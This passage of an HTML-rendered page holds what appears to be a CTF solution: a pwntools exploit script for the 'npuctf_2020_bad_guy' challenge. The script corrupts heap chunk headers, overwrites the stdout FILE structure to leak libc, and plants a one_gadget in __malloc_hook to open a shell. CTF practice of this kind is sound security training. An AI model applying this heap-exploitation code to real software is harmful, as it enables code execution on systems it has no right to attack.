class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#! /usr/bin/python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#import sys&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SigreturnFrame(kernel = &lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binary = &lt;span class=&#34;string&#34;&gt;&amp;quot;./npuctf_2020_bad_guy&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;one = [&lt;span class=&#34;number&#34;&gt;0x45226&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x4527a&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xf03a4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xf1247&lt;/span&gt;]  &lt;span class=&#34;comment&#34;&gt;#2.23-0ubuntu11.3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#one = [0x45216,0x4526a,0xf02a4,0xf1147] # buuctf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#idx = int(sys.argv[1])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; local:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p = process(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    e = ELF(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    libc = e.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p = remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;27593&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    e = ELF(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#libc = e.libc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc-2.23.buu.so&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;################################ Condfig ############################################&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sd = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s:p.send(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s:p.sendline(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rc = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s:p.recv(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; s:p.recvuntil(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a,s:p.sendafter(a,s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; a,s:p.sendlineafter(a,s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;it = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;z&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;s=&lt;span class=&#34;string&#34;&gt;&amp;#x27;b main&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p,s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;logs&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;mallocr,string=&lt;span class=&#34;string&#34;&gt;&amp;#x27;logs&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;isinstance&lt;/span&gt;(mallocr,&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[1;31;40m%20s--&amp;gt;0x%x\033[0m&amp;#x27;&lt;/span&gt;%(string,mallocr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[1;31;40m%20s--&amp;gt;%s\033[0m&amp;#x27;&lt;/span&gt;%(string,mallocr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pa&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;s=&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    log.success(&lt;span class=&#34;string&#34;&gt;&amp;#x27;pause : step---&amp;gt; &amp;#x27;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(s))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;info&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;data,key=&lt;span class=&#34;string&#34;&gt;&amp;#x27;info&amp;#x27;&lt;/span&gt;,bit=&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(bit == &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      leak = u64(data.ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\0&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      leak = u32(data.ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\0&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    logs(leak,key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; leak&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;################################ Function ############################################&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,s,c = &lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index :&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(s))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sa(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Content:&amp;#x27;&lt;/span&gt;,c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i,s,c = &lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index :&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(s))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sa(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content:&amp;#x27;&lt;/span&gt;,c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index :&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;################################### Statr ############################################&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pwn&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x91&lt;/span&gt;)&lt;span class=&#34;comment&#34;&gt;# + p64(0) * 3 + p64(0x91)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload),payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x71&lt;/span&gt;) + p16(&lt;span class=&#34;number&#34;&gt;0x25dd&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#* 3 + p64(0x91)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload),payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = &lt;span class=&#34;number&#34;&gt;0x33&lt;/span&gt; * p8(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0xfbad800&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pa()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#libc.address = info(ru(&amp;#x27;\x7f&amp;#x27;)[-6:]) - (0x7ffff7dd2600 - 0x7ffff7a0d000)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#libc.address = info(ru(&amp;#x27;\x7f&amp;#x27;)[-6:])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#print(hex(libc.address))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    libc.address = info(ru(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\x7f&amp;#x27;&lt;/span&gt;)[-&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;:]) - (&lt;span class=&#34;number&#34;&gt;0x7ffff7dd2600&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x7ffff7a0d000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc.address))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x71&lt;/span&gt;) + p64(libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__malloc_hook&amp;#x27;&lt;/span&gt;] - &lt;span class=&#34;number&#34;&gt;0x23&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;#* 3 + p64(0x91)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(payload),payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload = &lt;span class=&#34;number&#34;&gt;0x13&lt;/span&gt; * p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(libc.offset_to_vaddr(one[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Index :&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;################################### End ##############################################&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 